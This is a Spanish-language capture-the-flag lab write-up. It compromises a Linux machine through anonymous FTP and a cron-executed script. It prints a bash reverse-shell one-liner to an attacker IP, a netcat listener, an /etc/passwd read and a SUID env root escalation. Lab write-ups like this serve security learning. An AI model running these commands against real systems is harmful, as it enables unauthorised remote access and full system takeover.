# Anonymous

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux aprovechando un **Anonymous FTP Login**, modificar un script ejecutado automáticamente para obtener una **reverse shell** y escalar privilegios mediante un binario **SUID** hasta conseguir acceso como **root**.

---

## 🛠️ Tecnologías trabajadas

- FTP
- Anonymous Login
- Reverse Shell
- Netcat
- SUID
- GTFOBins
- Bash

---

## 🧠 Metodología

La enumeración inicial mostró varios servicios interesantes, pero uno destacaba especialmente: el servidor FTP permitía el acceso mediante **Anonymous Login**. En lugar de centrarme inmediatamente en Samba o SSH, decidí aprovechar primero el acceso ya disponible para comprobar qué información podía obtener desde el propio servidor.

Durante la exploración del FTP encontré varios scripts relacionados con tareas de mantenimiento. En lugar de limitarme a descargarlos para analizarlos, revisé su contenido buscando indicios de ejecución automática. Uno de ellos era ejecutado periódicamente, lo que lo convertía en un excelente candidato para obtener ejecución remota de código.

La estrategia consistió en sustituir el contenido del script por una **reverse shell** y esperar a que el proceso automático lo ejecutara. Tras obtener acceso al sistema, realicé la enumeración interna habitual para localizar usuarios, archivos interesantes y posibles vectores de escalada.

Finalmente, la búsqueda de binarios **SUID** permitió identificar un binario vulnerable que podía explotarse fácilmente mediante una técnica documentada en GTFOBins, obteniendo así acceso completo al sistema.

Este laboratorio demuestra la importancia de revisar cuidadosamente cualquier acceso inicial, ya que una mala configuración aparentemente sencilla puede comprometer toda la máquina.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé comprobando la conectividad con la máquina objetivo mediante `ping` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido.

Posteriormente realicé un escaneo completo utilizando Nmap.

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.10.103.15
```

Se identificaron los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 21 | FTP (Anonymous Login permitido) |
| 22 | SSH |
| 139 | SMB |
| 445 | SMB |

El servicio FTP llamó especialmente la atención al permitir autenticación anónima.

---

### 2. Enumeración del servicio FTP

Accedí al servidor FTP utilizando el usuario **anonymous** sin necesidad de introducir contraseña.

```bash
ftp 10.10.103.15
```

Durante la exploración encontré el siguiente directorio:

```
scripts/
```

En su interior aparecían varios archivos:

- `clean.sh`
- `removed_file.log`
- `to_do.txt`

El archivo `to_do.txt` indicaba que debía deshabilitarse el acceso mediante Anonymous FTP, confirmando que esta mala configuración formaba parte de la cadena de explotación.

Tras revisar los archivos observé que `clean.sh` era ejecutado automáticamente de forma periódica.

---

### 3. Obtención del acceso inicial

Aprovechando los permisos de escritura sobre `clean.sh`, sustituí su contenido por una **reverse shell**.

```bash
bash -i >& /dev/tcp/10.23.88.247/4444 0>&1
```

En mi máquina atacante preparé un listener mediante Netcat.

```bash
nc -lvnp 4444
```

Después de unos segundos el script fue ejecutado automáticamente y recibí una conexión desde la máquina víctima.

---

### 4. Estabilización de la shell

Para trabajar de forma más cómoda realicé el tratamiento habitual de la TTY.

```bash
script /dev/null -c bash
```

Posteriormente configuré correctamente el terminal utilizando:

```bash
stty raw -echo
reset xterm
export TERM=xterm
export SHELL=bash
```

La shell obtenida pertenecía al usuario:

```
namelessone
```

---

### 5. Enumeración interna

Comencé revisando los usuarios existentes.

```bash
cat /etc/passwd
```

Además del usuario comprometido únicamente existía el usuario **root**.

Durante la exploración del directorio personal encontré un recurso compartido llamado:

```
pics
```

También localicé la primera flag:

```
user.txt
```

A continuación revisé las posibilidades de escalada habituales.

```bash
sudo -l
```

No existían permisos interesantes.

Por ello busqué binarios SUID.

```bash
find / -perm -4000 2>/dev/null
```

---

### 6. Escalada de privilegios

Durante la búsqueda apareció el siguiente binario:

```
/usr/bin/env
```

Consultando GTFOBins comprobé que podía utilizarse para conservar privilegios elevados.

Ejecuté:

```bash
/usr/bin/env /bin/bash -p
```

Con este comando obtuve una shell como **root**.

Finalmente accedí al directorio:

```
/root
```

y recuperé la última flag del laboratorio.

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió comprender cómo una mala configuración aparentemente sencilla puede convertirse en una cadena completa de compromiso del sistema.
- Aprovechar un servidor FTP configurado con **Anonymous Login**.
- Identificar scripts ejecutados automáticamente como posibles vectores de ejecución remota.
- Sustituir scripts de mantenimiento por una **reverse shell**.
- Estabilizar shells interactivas utilizando herramientas integradas de Linux.
- Identificar recursos compartidos y archivos interesantes durante la post-explotación.
- Buscar y explotar binarios **SUID** utilizando GTFOBins.
- Escalar privilegios mediante el binario `env`.


### Reflexión

La mayor enseñanza de esta máquina fue comprobar que una configuración insegura en un servicio tan habitual como FTP puede comprometer completamente un sistema. El acceso anónimo permitió modificar un script ejecutado automáticamente, evitando la necesidad de explotar vulnerabilidades complejas. Además, el laboratorio reforzó la importancia de revisar siempre las tareas automatizadas y los permisos sobre los archivos, ya que un simple script de mantenimiento puede convertirse en un vector directo de ejecución de código.
